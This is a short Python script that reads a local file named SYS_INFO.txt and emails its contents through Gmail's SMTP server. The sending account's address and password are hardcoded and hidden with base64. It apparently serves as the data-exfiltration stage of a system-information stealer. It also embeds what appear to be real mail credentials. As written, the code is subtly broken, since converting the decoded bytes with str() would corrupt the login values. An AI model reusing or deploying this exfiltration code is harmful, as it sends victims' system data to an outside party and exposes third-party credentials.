import smtplib
import codecs
import logging
from email.message import EmailMessage

logging.basicConfig(filename="winfo.log", filemode="a", level=logging.DEBUG)

USER = b"bG9nYW5rZGV2ZW1haWxAZ21haWwuY29t"
PASS = b"Z2h3aSB1bHhuIHB6YnIgem56dw=="
SYS_INFO = "SYS_INFO.txt"

email = EmailMessage()
email["from"] = "SYS_INFO"
email["to"] = codecs.decode(USER, "base64")
email["subject"] = "SYSINFO"


def cast_file_to_message(file):
    """Read SYS_INFO.txt and cast it as a string into the body of an email."""
    logging.debug("Casting file to message...")
    with open(file, "r") as f:
        message = f.read()
        logging.debug("File cast to message.")
        return message


def send_mail():
    """Send email."""
    decUser = str(codecs.decode(USER, "base64"))
    decPass = str(codecs.decode(PASS, "base64"))
    with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
        smtp.ehlo()
        smtp.starttls()
        smtp.login(decUser, decPass)
        smtp.send_message(email)
        logging.debug("Message sent!")
        print("Message sent successfully!")


if __name__ == "__main__":
    email.set_content(cast_file_to_message(SYS_INFO))
    send_mail()
